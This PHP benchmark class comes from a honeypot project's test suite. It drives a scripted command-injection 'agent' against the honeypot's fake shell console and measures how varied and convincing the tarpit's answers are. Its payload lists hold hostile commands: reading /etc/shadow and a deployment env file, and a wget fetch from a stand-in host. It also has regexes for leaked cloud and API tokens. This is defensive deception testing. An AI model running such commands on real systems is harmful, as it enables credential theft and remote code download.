<?php

declare(strict_types=1);

namespace Funnypot\Tests\Bench;

use Funnypot\App\Admin\AdminAuth;
use Funnypot\App\Config\ConfigStore;
use Funnypot\App\Http\CorporateController;
use Funnypot\App\Http\DashboardController;
use Funnypot\App\Http\HomeController;
use Funnypot\App\Http\LabyrinthController;
use Funnypot\App\Http\Router;
use Funnypot\App\Tarpit\Cmdi\ShellLexer;
use Funnypot\Core\Attack\CannedData;
use Funnypot\Core\RequestContext;
use Funnypot\Tests\App\Tarpit\Cmdi\ConsoleHarness;
use Funnypot\Tests\App\Tarpit\Cmdi\SpyCmdiStore;

/**
 * A scripted "variant-exhaustion" agent against the console, through the real Router and
 * HoneypotController: it posts a command to the lure form, reads the error, applies the canonical fix
 * for whatever the error blames (close the quote, escape the backtick, append the paren, swap the
 * operator, ...), and when a command "works" it adds an exfil step. It reports whether it ever got
 * anywhere and how varied the console's answers were.
 */
final class CmdiSyntaxSweep
{
    private const STARTS = [
        'id; cat /etc/shadow',
        "cat /etc/passwd | grep 'root'",
        'echo `whoami` && id',
        'psql -c "select * from users" | head',
        'ls -la /root; cat /run/deploy/app.env',
    ];
    private const EXFIL = ['; cat /etc/shadow', ' | base64', ' && wget -qO- http://10.0.0.5/x', '; cat /run/deploy/app.env', '; ls -la /root', ' | head -5'];
    private const OPS = [';', '|', '&&', '||', "\n"];
    private const TOOLS = ['cat', 'ls', 'id', 'grep', 'find', 'head', 'awk', 'base64'];

    /** @return array<string,mixed> */
    public static function run(int $seed, int $steps, string $catalog, string $identity = 'auto', bool $withTrace = false): array
    {
        $h = ConsoleHarness::build([
            'catalog' => $catalog,
            'pin' => $identity,
            'clock' => static fn (): int => 1795000000,
            'env' => ['FUNNYPOT_JITTER_MS' => '0', 'FUNNYPOT_LATENCY_MS' => '0'],
        ]);
        try {
            $router = self::router($h);
            mt_srand($seed);
            $ip = '10.' . (1 + $seed % 200) . '.' . (1 + intdiv($seed, 200) % 200) . '.7';
            $payload = self::STARTS[$seed % count(self::STARTS)];

            $shapes = [];
            $messages = [];
            $owned = [];
            $goal = 0;
            $nonShell = 0;
            $digest = hash_init('sha256');
            $shadowHash = explode(':', explode("\n", CannedData::SHADOW)[0])[1];
            /** @var SpyCmdiStore $spy */
            $spy = $h->store;

            $seen = [];
            $trace = [];
            $picked = [];
            $defects = 0;
            for ($i = 0; $i < $steps; $i++) {
                $seen[ShellLexer::lex($payload)->shapeKey] = true;
                $before = count($spy->writes);
                $body = self::post($router, $payload, $ip);
                hash_update($digest, $payload . "\0" . $body . "\0");
                $shapes[ShellLexer::lex($payload)->shapeKey] = true;
                $write = $spy->writes[$before] ?? null;
                $msg = $write === null ? 'none' : ($write['kind'] === 'accept' ? 'accept:' . $write['sub'] : ($write['kind'] === 'landing' ? 'landing' : (string) $write['msg_id']));
                $messages[] = $msg;
                if ($write !== null && !in_array($write['sub'], ['defect', 'facts', 'landing'], true)) {
                    $picked[] = $msg;
                } elseif ($write !== null && $write['sub'] === 'defect') {
                    $defects++;
                }
                if ($write !== null) {
                    $owned[(string) $write['owned_by_rule']] = ($owned[(string) $write['owned_by_rule']] ?? 0) + 1;
                }
                if (strpos($body, '<title>Shell</title>') === false || preg_match('~<pre>(.*)</pre>~s', $body, $m) !== 1) {
                    $nonShell++;
                    $text = $body;
                } else {
                    $text = html_entity_decode($m[1], ENT_QUOTES, 'UTF-8');
                }
                $goal += self::goalProof($text, $shadowHash);
                $trace[] = [$msg, $payload];
                $next = self::fix($payload, $text, $msg);
                // An exhaustive agent does not resend a structure it already tried: it changes the
                // encoding, quoting or plumbing until the attempt is new.
                for ($try = 0; isset($seen[ShellLexer::lex($next)->shapeKey]) && $try < 12; $try++) {
                    $next = self::vary($next);
                }
                $payload = $next;
            }

            $hist = array_count_values($messages);
            arsort($hist);

            return [
                'seed' => $seed,
                'catalog' => $catalog,
                'identity' => $identity,
                'steps' => $steps,
                'distinct_shapes' => count($shapes),
                'messages' => $hist,
                'distinct_messages' => count($hist),
                'max_message_share' => $steps > 0 ? round(max($hist) / $steps, 3) : 0,
                'accepts' => count(array_filter($messages, static fn (string $m): bool => str_starts_with($m, 'accept'))),
                'longest_run' => self::longestRun($messages),
                'true_defects' => $defects,
                'picked_turns' => count($picked),
                'longest_picked_run' => self::longestRun($picked),
                // Over the answers the console chose (phantom errors and compound accepts). A real
                // syntax error repeats while the attacker leaves it unfixed, exactly as in a shell.
                'shortest_sustained_period' => self::sustainedPeriod($picked, 8, 3),
                'goal_proof_hits' => $goal,
                'owned_by_rule' => $owned,
                'non_shell_bodies' => $nonShell,
                'digest' => hash_final($digest),
            ] + ($withTrace ? ['trace' => $trace] : []);
        } finally {
            $h->cleanup();
        }
    }

    private static function router(ConsoleHarness $h): Router
    {
        $assets = dirname(__DIR__, 2) . '/demo/assets';
        $geo = new \Geo($h->dir . '/no-geo.csv');

        return new Router(
            $h->config,
            $h->controller,
            new DashboardController($h->hits, $geo, $h->config, $assets, null, null, $h->hits, new AdminAuth($h->dir . '/auth.sqlite'), new ConfigStore($h->dir . '/cfg.sqlite')),
            new CorporateController($h->hits, $geo, $h->config, $assets, null, null),
            new HomeController($h->hits, $geo, $h->config, $assets, null, LabyrinthController::entryHint()),
        );
    }

    private static function post(Router $router, string $cmd, string $ip): string
    {
        ob_start();
        @$router->dispatch(new RequestContext('POST', '/admin/root/post', '', ['Content-Type' => 'application/x-www-form-urlencoded', 'User-Agent' => 'python-requests/2.31'], ConsoleHarness::form($cmd, 'plus')), $ip, 'off');

        return (string) ob_get_clean();
    }

    /** Anything that would let the agent claim the goal: a crackable hash, a key, a secret, a win. */
    private static function goalProof(string $text, string $shadowHash): int
    {
        $hits = 0;
        if (preg_match_all('~\$6\$[^:\s]+~', $text, $m) > 0) {
            foreach ($m[0] as $h) {
                if ($h !== $shadowHash) {
                    $hits++;
                }
            }
        }
        foreach (['BEGIN OPENSSH', 'PRIVATE KEY', 'HTTP/1.1 200', '200 OK', 'Connected to', 'saved', 'written'] as $n) {
            if (strpos($text, $n) !== false) {
                $hits++;
            }
        }

        return $hits + (int) (preg_match('~AKIA[0-9A-Z]{16}|sk_(?:live|test)_|ghp_[A-Za-z0-9]{20}|xox[bp]-~', $text) === 1);
    }

    /** The canonical fix for whatever the console blamed. */
    private static function fix(string $p, string $text, string $msg): string
    {
        $pick = static fn (array $a) => $a[mt_rand(0, count($a) - 1)];
        $line = strtok($text, "\n") ?: '';
        if (strlen($p) > 240) {
            return self::STARTS[mt_rand(0, count(self::STARTS) - 1)];
        }
        if (str_contains($line, 'unterminated quoted string')) {
            // Close the quote that is open; if none is, swap or drop the quoting.
            if (substr_count($p, "'") % 2 === 1) {
                return $p . "'";
            }
            if (substr_count($p, '"') % 2 === 1) {
                return $p . '"';
            }

            return match (mt_rand(0, 2)) {
                0 => strtr($p, ["'" => '"', '"' => "'"]),
                1 => str_replace(["'", '"', '\\'], '', $p),
                default => $p . " '" . $pick(self::TOOLS) . "'",
            };
        }
        if (str_contains($line, 'backquote')) {
            if (str_contains($p, '`')) {
                return mt_rand(0, 1) === 0
                    ? (preg_replace('~`([^`]*)`~', '$($1)', $p, 1) ?? $p)
                    : str_replace('`', '\\`', $p);
            }

            return $p . ' `id`';
        }
        if (preg_match('~\(expecting (?:"([^"]+)"|(word))\)~', $line, $m) === 1) {
            $want = $m[1] !== '' ? $m[1] : 'word';
            if ($want === ')' && str_contains($p, '$(') && mt_rand(0, 1) === 0) {
                return preg_replace('~\$\(([^()]*)\)~', '`$1`', $p, 1) ?? $p;
            }

            return $p . ($want === 'word' ? ' x' : ' ' . $want);
        }
        if (preg_match('~unexpected "([^"]+)"~', $line, $m) === 1) {
            $op = $m[1];
            $others = array_values(array_diff(self::OPS, [$op]));
            if (in_array($op, self::OPS, true) || $op === '&') {
                $all = [];
                for ($o = strpos($p, $op); $o !== false; $o = strpos($p, $op, $o + 1)) {
                    $all[] = $o;
                }
                $pos = $all === [] ? false : $all[mt_rand(0, count($all) - 1)];

                return $pos === false ? $p . $pick(self::EXFIL) : substr($p, 0, $pos) . ' ' . $pick($others) . ' ' . ltrim(substr($p, $pos + strlen($op)));
            }

            return self::STARTS[mt_rand(0, count(self::STARTS) - 1)] . $pick(self::EXFIL);
        }
        if (str_contains($line, 'redirection') || str_contains($line, "can't create")) {
            return mt_rand(0, 1) === 0 ? (preg_replace('~\s*\d*>>?\s*\S+~', '', $p, 1) ?? $p) : (preg_replace('~>\s*\S+~', '> /tmp/o' . mt_rand(1, 99), $p, 1) ?? $p);
        }
        if (str_contains($line, 'unexpected newline')) {
            return str_replace("\n", '; ', $p);
        }
        if (str_contains($line, 'unexpected end of file')) {
            return $p . ' ' . $pick(self::TOOLS);
        }
        if (str_contains($line, 'missing') || str_contains($line, 'bad substitution')) {
            return (preg_replace('~\$\{[^}]*\}?|\$\(\([^)]*\)?\)?~', '$HOME', $p, 1) ?? $p) . ' ' . $pick(self::TOOLS);
        }
        if (str_contains($line, 'not found')) {
            return preg_replace('~^\S+~', $pick(self::TOOLS), $p, 1) ?? $p;
        }
        if (str_contains($line, "can't fork") || $line === 'Killed') {
            return $p . ' 2>&1';
        }
        if (str_starts_with($msg, 'accept') || $msg === 'landing') {
            return $p . $pick(self::EXFIL);
        }

        return $p . $pick(self::EXFIL);
    }

    /** A further variant of a payload: another step, other quoting, other plumbing. */
    private static function vary(string $p): string
    {
        $pick = static fn (array $a) => $a[mt_rand(0, count($a) - 1)];

        return match (mt_rand(0, 6)) {
            0 => $p . $pick(self::EXFIL),
            1 => preg_replace('~ (/[^\s\'"]+)~', " '$1'", $p, 1) ?? $p,
            2 => $p . ' 2>&1',
            3 => 'cd /tmp; ' . $p,
            4 => preg_replace('~ (/[^\s\'"]+)~', ' "$1"', $p, 1) ?? $p,
            5 => 'echo $(' . $p . ')',
            default => $p . ' ' . $pick(self::OPS) . ' ' . $pick(self::TOOLS) . ' /etc/hosts',
        };
    }

    /** @param list<string> $seq */
    private static function longestRun(array $seq): int
    {
        $best = 0;
        $run = 0;
        $prev = null;
        foreach ($seq as $s) {
            $run = $s === $prev ? $run + 1 : 1;
            $prev = $s;
            $best = max($best, $run);
        }

        return $best;
    }

    /**
     * The smallest period p <= $maxPeriod that the message sequence repeats for $times consecutive
     * periods anywhere, or null. A deterministic trap cycles; this must stay null.
     *
     * @param list<string> $seq
     */
    public static function sustainedPeriod(array $seq, int $maxPeriod, int $times): ?int
    {
        $n = count($seq);
        for ($p = 1; $p <= $maxPeriod; $p++) {
            $span = $p * $times;
            for ($i = 0; $i + $span <= $n; $i++) {
                $ok = true;
                for ($j = $i + $p; $j < $i + $span; $j++) {
                    if ($seq[$j] !== $seq[$j - $p]) {
                        $ok = false;
                        break;
                    }
                }
                if ($ok) {
                    return $p;
                }
            }
        }

        return null;
    }
}
